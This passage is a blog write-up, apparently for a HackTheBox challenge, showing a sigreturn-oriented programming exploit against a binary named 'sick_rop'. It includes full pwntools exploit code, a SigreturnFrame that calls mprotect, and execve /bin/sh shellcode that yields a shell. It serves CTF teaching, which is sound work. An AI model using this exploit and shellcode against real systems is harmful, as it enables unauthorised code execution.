binary.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_41":{"id":"1ea4f27dbd72_41","__typename":"Paragraph","name":"6736","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*xBBf1Kaw8gBlMwlQclpnQQ.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_42":{"id":"1ea4f27dbd72_42","__typename":"Paragraph","name":"f22b","text":"The minimum address is 0x400000. So we will make this place a writable segment. Next from syscall table. sys_mprotect is RAX=10. In pwntools, you can create a frame with all register values you want.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_43":{"id":"1ea4f27dbd72_43","__typename":"Paragraph","name":"a638","text":"Next, we need the syscall address to place in one of the registers. For this, we can use ROPgadget.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_44":{"id":"1ea4f27dbd72_44","__typename":"Paragraph","name":"a592","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*lpR6D3fCJaP7LKgLDmHkvQ.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_45":{"id":"1ea4f27dbd72_45","__typename":"Paragraph","name":"cc50","text":"Here is the code for frame.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_46":{"id":"1ea4f27dbd72_46","__typename":"Paragraph","name":"8e23","text":"syscall = 0x401014","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_47":{"id":"1ea4f27dbd72_47","__typename":"Paragraph","name":"4b38","text":"vuln_function  = p64(0x40102e)\nvuln_pointer = 0x4010d8","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_48":{"id":"1ea4f27dbd72_48","__typename":"Paragraph","name":"92a5","text":"writable = 0x400000","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_49":{"id":"1ea4f27dbd72_49","__typename":"Paragraph","name":"0e2a","text":"frame = SigreturnFrame(kernel=”amd64\")\nframe.rax = 10 #Mprotect for syscall table\nframe.rdi = writable #Writable memory segment\nframe.rsi = 0x4000 #Size\nframe.rdx = 7 #Read\u002FWrite\u002FExectable access\nframe.rsp = vuln_pointer #Why not vuln function but a pointer to vuln? Explained below\nframe.rip = syscall #Calling the syscall in the end","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_50":{"id":"1ea4f27dbd72_50","__typename":"Paragraph","name":"d9f6","text":"These are the registers we will use to create a frame and trigger a sigreturn call after this.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_51":{"id":"1ea4f27dbd72_51","__typename":"Paragraph","name":"d9a6","text":"Here, RAX=10 is for calling the mprotect for the Linux syscall table. RDI=writable area segment. RSI = 0x4000, This is the size of the stack frame we allocate(You can change this value).RDX=7 for giving the stack frame read, write, and executable access.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_52":{"id":"1ea4f27dbd72_52","__typename":"Paragraph","name":"f3b2","text":"Now here is where I stumbled a bit. RSP is for returning to a place after the entire process finishes (Just like a safe point without crashing). Calling the vuln() again is an advantage here as we get to call the read function again. Notice I did not send the vuln function address here, instead, I called pointer to vuln function. This is because we are changing the stack frame and calling the vuln function directly will not get us to that function.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_53":{"id":"1ea4f27dbd72_53","__typename":"Paragraph","name":"fe1e","text":"Fortunately calling a pointer to function allows us to get to the vuln function. We can find the pointer value using gdb. Break the main and then use “find” in gdb-peda.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_54":{"id":"1ea4f27dbd72_54","__typename":"Paragraph","name":"5d74","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ecAyT1nvEDPc_6U_SpqrWQ.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_55":{"id":"1ea4f27dbd72_55","__typename":"Paragraph","name":"0383","text":"0x4010d8 is the pointer of the function vuln.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_56":{"id":"1ea4f27dbd72_56","__typename":"Paragraph","name":"015e","text":"Now we craft our first payload.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_57":{"id":"1ea4f27dbd72_57","__typename":"Paragraph","name":"30dd","text":"payload = b\"A\"*40 + vuln_function + p64(syscall) + bytes(frame)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_58":{"id":"1ea4f27dbd72_58","__typename":"Paragraph","name":"5076","text":"First, we overwrite and reach RIP\u002FReturn with 40 junk characters. Then we call the vuln_function to get the read function. Calling a syscall will execute the read and then we send in the frame as bytes. Now we need to trigger a sigreturn signal to activate what we just sent. To call a sigreturn we can have a look at the Linux syscall table again. Rax=15 will trigger a sigreturn. But we don’t have any pop rax gadget here to trigger a sigreturn call. But here is a technique that works. The number of bytes we send in the input stream after executing the binary is stored in the RAX. We can notice this if you attach gdb after the first payload is sent","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_59":{"id":"1ea4f27dbd72_59","__typename":"Paragraph","name":"f069","text":"payload1 = b\"A\"*40 + vuln_function + p64(syscall) + bytes(frame)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_60":{"id":"1ea4f27dbd72_60","__typename":"Paragraph","name":"053b","text":"p.sendline(payload1)\np.recv()","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_61":{"id":"1ea4f27dbd72_61","__typename":"Paragraph","name":"5449","text":"gdb.attach(p)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_62":{"id":"1ea4f27dbd72_62","__typename":"Paragraph","name":"4b3c","text":"","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*xWnrhgphGbEM-8muIYQO1w.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_63":{"id":"1ea4f27dbd72_63","__typename":"Paragraph","name":"c518","text":"I sent some junk char into the input stream. Then I had a look at the reg values. RAX is set to 54. But we only send 53 characters into the stream. So the enter key after I sent an input is also taken into consideration.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_64":{"id":"1ea4f27dbd72_64","__typename":"Paragraph","name":"d378","text":"The second payload is just 15 junk characters.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_65":{"id":"1ea4f27dbd72_65","__typename":"Paragraph","name":"4b91","text":"payload = b\"C\"*15\np.send(payload)\np.recv()","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_66":{"id":"1ea4f27dbd72_66","__typename":"Paragraph","name":"2949","text":"After this our stack becomes executable and you can confirm this with gdb attach after sending the second payload.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_67":{"id":"1ea4f27dbd72_67","__typename":"Paragraph","name":"98f6","text":"Next, we can store the payload into our buffer. Then Execute it by calling the starting of shellcode address in our RIP\u002FReturn region. For finding the starting of shellcode we use gdb attach again.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_68":{"id":"1ea4f27dbd72_68","__typename":"Paragraph","name":"78d6","text":"payload = b\"C\"*15","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_69":{"id":"1ea4f27dbd72_69","__typename":"Paragraph","name":"0b36","text":"p.send(payload)\np.recv()","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_70":{"id":"1ea4f27dbd72_70","__typename":"Paragraph","name":"81de","text":"gdb.attach(p)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_71":{"id":"1ea4f27dbd72_71","__typename":"Paragraph","name":"2fbd","text":"","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*UeNBnalh6kgLyiFcRvJRaQ.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_72":{"id":"1ea4f27dbd72_72","__typename":"Paragraph","name":"347e","text":"The bunch of A’s are stored in RSI\u002FR10, So 0x4010b8 is the starting address of shellcode. Instead of A’s we can store our shellcode and execute it.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_73":{"id":"1ea4f27dbd72_73","__typename":"Paragraph","name":"187c","text":"shellcode = (b\"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\") # 23bytes","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_74":{"id":"1ea4f27dbd72_74","__typename":"Paragraph","name":"071e","text":"payload3 = shellcode + b\"\\x90\"*17 + p64(0x00000000004010b8)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_75":{"id":"1ea4f27dbd72_75","__typename":"Paragraph","name":"dd82","text":"p.send(payload3)\np.recv()","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_76":{"id":"1ea4f27dbd72_76","__typename":"Paragraph","name":"513f","text":"17 bytes is to fill the extra spaces after shellcode is stored. Calling the starting address of shellcode, we can execute the shellcode and pop our shell.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_77":{"id":"1ea4f27dbd72_77","__typename":"Paragraph","name":"5793","text":"Here is the full code.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_78":{"id":"1ea4f27dbd72_78","__typename":"Paragraph","name":"b268","text":"from pwn import *\ncontext.clear(arch='amd64')","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_79":{"id":"1ea4f27dbd72_79","__typename":"Paragraph","name":"4b0d","text":"p = process(\".\u002Fsick_rop\")\np = remote(\"*IP Address*\" , port number)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_80":{"id":"1ea4f27dbd72_80","__typename":"Paragraph","name":"23c5","text":"shellcode = (b\"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\") # 23B \u002F\u002F From shellstrorm","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_81":{"id":"1ea4f27dbd72_81","__typename":"Paragraph","name":"7649","text":"syscall = 0x401014","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_82":{"id":"1ea4f27dbd72_82","__typename":"Paragraph","name":"30e9","text":"vuln_function  = p64(0x40102e)\nvuln_pointer = 0x4010d8","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_83":{"id":"1ea4f27dbd72_83","__typename":"Paragraph","name":"e3df","text":"writable = 0x400000","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_84":{"id":"1ea4f27dbd72_84","__typename":"Paragraph","name":"0d7c","text":"frame = SigreturnFrame(kernel=\"amd64\")\nframe.rax = 10 #Mprotect for syscall table\nframe.rdi = writable #Writable memory segment\nframe.rsi = 0x4000 #Size\nframe.rdx = 7 #Read\u002FWrite\u002FExectable access\nframe.rsp = vuln_pointer #Why not vuln function but a pointer to vuln?\nframe.rip = syscall #Calling the syscall in the end","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_85":{"id":"1ea4f27dbd72_85","__typename":"Paragraph","name":"24a4","text":"payload1 = b\"A\"*40 + vuln_function + p64(syscall) + bytes(frame)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_86":{"id":"1ea4f27dbd72_86","__typename":"Paragraph","name":"08b5","text":"p.sendline(payload1)\np.recv()","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_87":{"id":"1ea4f27dbd72_87","__typename":"Paragraph","name":"0f2f","text":"#gdb.attach(p)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_88":{"id":"1ea4f27dbd72_88","__typename":"Paragraph","name":"b0f0","text":"payload = b\"C\"*15","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_89":{"id":"1ea4f27dbd72_89","__typename":"Paragraph","name":"79a5","text":"p.send(payload)\np.recv()","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_90":{"id":"1ea4f27dbd72_90","__typename":"Paragraph","name":"893c","text":"payload3 = shellcode + b\"\\x90\"*17 + p64(0x00000000004010b8)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_91":{"id":"1ea4f27dbd72_91","__typename":"Paragraph","name":"7ed6","text":"p.send(payload3)\np.recv()","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_92":{"id":"1ea4f27dbd72_92","__typename":"Paragraph","name":"a457","text":"# gdb.attach(p)","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_93":{"id":"1ea4f27dbd72_93","__typename":"Paragraph","name":"b2dd","text":"p.interactive()","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_94":{"id":"1ea4f27dbd72_94","__typename":"Paragraph","name":"7bfe","text":"Executing this, we pop our shell.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_95":{"id":"1ea4f27dbd72_95","__typename":"Paragraph","name":"05e1","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*bZUFmM50lkfN1zQFO_QtjA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_96":{"id":"1ea4f27dbd72_96","__typename":"Paragraph","name":"5363","text":"Use this in remote and get your flag.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_97":{"id":"1ea4f27dbd72_97","__typename":"Paragraph","name":"35d6","text":"Hope you understood the challenge. Do check out my other blogs.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_98":{"id":"1ea4f27dbd72_98","__typename":"Paragraph","name":"69b6","text":"Don’t forget to give some claps if you reached here :) Follow me for more write-ups.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_99":{"id":"1ea4f27dbd72_99","__typename":"Paragraph","name":"5765","text":"Goodbye:)","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"ImageMetadata:1*sy8HBkyGs-6MKI_GIckiCA.png":{"id":"1*sy8HBkyGs-6MKI_GIckiCA.png","__typename":"ImageMetadata","originalHeight":346,"originalWidth":763,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*VtUlsnaISQBtkpytnBBgbw.png":{"id":"1*VtUlsnaISQBtkpytnBBgbw.png","__typename":"ImageMetadata","originalHeight":365,"originalWidth":808,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*IqO_Mw8y7gIqJflrTpwVlw.png":{"id":"1*IqO_Mw8y7gIqJflrTpwVlw.png","__typename":"ImageMetadata","originalHeight":38,"originalWidth":1078,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*qhZvkVwfgaKN1hawRYtIwQ.png":{"id":"1*qhZvkVwfgaKN1hawRYtIwQ.png","__typename":"ImageMetadata","originalHeight":72,"originalWidth":1081,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*hKlVnyNpD-qd8sNuonuIsw.png":{"id":"1*hKlVnyNpD-qd8sNuonuIsw.png","__typename":"ImageMetadata","originalHeight":192,"originalWidth":773,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*qMAmVVx99bZ3wicWMyiSzA.png":{"id":"1*qMAmVVx99bZ3wicWMyiSzA.png","__typename":"ImageMetadata","originalHeight":608,"originalWidth":689,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*RL4cAi9PpHF1QfGdz3oObg.png":{"id":"1*RL4cAi9PpHF1QfGdz3oObg.png","__typename":"ImageMetadata","originalHeight":279,"originalWidth":910,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*IFXEa_Et85SV6AlA1sBC4Q.png":{"id":"1*IFXEa_Et85SV6AlA1sBC4Q.png","__typename":"ImageMetadata","originalHeight":469,"originalWidth":1241,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*EqkGfMk-rgMp7wcL9ewbQQ.png":{"id":"1*EqkGfMk-rgMp7wcL9ewbQQ.png","__typename":"ImageMetadata","originalHeight":103,"originalWidth":571,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*xBBf1Kaw8gBlMwlQclpnQQ.png":{"id":"1*xBBf1Kaw8gBlMwlQclpnQQ.png","__typename":"ImageMetadata","originalHeight":136,"originalWidth":416,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*lpR6D3fCJaP7LKgLDmHkvQ.png":{"id":"1*lpR6D3fCJaP7LKgLDmHkvQ.png","__typename":"ImageMetadata","originalHeight":89,"originalWidth":1080,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*ecAyT1nvEDPc_6U_SpqrWQ.png":{"id":"1*ecAyT1nvEDPc_6U_SpqrWQ.png","__typename":"ImageMetadata","originalHeight":113,"originalWidth":749,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*xWnrhgphGbEM-8muIYQO1w.png":{"id":"1*xWnrhgphGbEM-8muIYQO1w.png","__typename":"ImageMetadata","originalHeight":658,"originalWidth":1918,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*UeNBnalh6kgLyiFcRvJRaQ.png":{"id":"1*UeNBnalh6kgLyiFcRvJRaQ.png","__typename":"ImageMetadata","originalHeight":714,"originalWidth":1637,"focusPercentX":null,"focusPercentY":null,"alt":null},"ImageMetadata:1*bZUFmM50lkfN1zQFO_QtjA.png":{"id":"1*bZUFmM50lkfN1zQFO_QtjA.png","__typename":"ImageMetadata","originalHeight":177,"originalWidth":1111,"focusPercentX":null,"focusPercentY":null,"alt":null},"Tag:cybersecurity":{"id":"cybersecurity","__typename":"Tag","displayTitle":"Cybersecurity","normalizedTagSlug":"cybersecurity"},"Tag:hackthebox":{"id":"hackthebox","__typename":"Tag","displayTitle":"Hackthebox","normalizedTagSlug":"hackthebox"},"Tag:hackthebox-writeup":{"id":"hackthebox-writeup","__typename":"Tag","displayTitle":"Hackthebox Writeup","normalizedTagSlug":"hackthebox-writeup"},"Tag:srop":{"id":"srop","__typename":"Tag","displayTitle":"Srop","normalizedTagSlug":"srop"},"Tag:sigrop":{"id":"sigrop","__typename":"Tag","displayTitle":"Sigrop","normalizedTagSlug":"sigrop"},"PostViewerEdge:postId:8b27727cd441-viewerId:ec69897f3ac2":{"id":"postId:8b27727cd441-viewerId:ec69897f3ac2","__typename":"PostViewerEdge","catalogsConnection":{"__typename":"EntityCatalogsConnection","catalogsContainingThis({\"type\":\"LISTS\"})":[],"predefinedContainingThis":[]}}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.ff678534.js"></script><script src="https://cdn-client.medium.com/lite/static/js/36804.29338eda.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.9b947485.js"></script><script src="https://cdn-client.medium.com/lite/static/js/45573.4354ed57.chunk.js"></script>